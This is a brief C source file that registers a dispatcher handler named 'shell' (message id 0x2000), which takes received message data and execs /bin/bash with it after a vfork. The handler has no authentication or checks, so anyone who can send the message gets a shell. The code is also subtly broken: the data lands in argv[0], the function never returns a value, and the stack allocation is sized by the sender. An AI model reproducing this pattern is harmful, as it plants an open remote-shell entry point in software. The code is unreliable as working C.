#include "Dispatcher.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <alloca.h>

static void* dispatch_shell ( unsigned short msgid, const void* data, unsigned int len, unsigned int* outLen )
{
	char* databuf = alloca(len + 1);
	memcpy(databuf, data, len);
	databuf[len] = 0;
	pid_t pid = vfork();
	if (pid == 0)
	{
		execl("/bin/bash", (const char*)databuf, NULL);
		_exit(0);
	}
}

CDUCK_REGISTER_DISPATCHER_STATIC(shell, 0x2000, dispatch_shell);
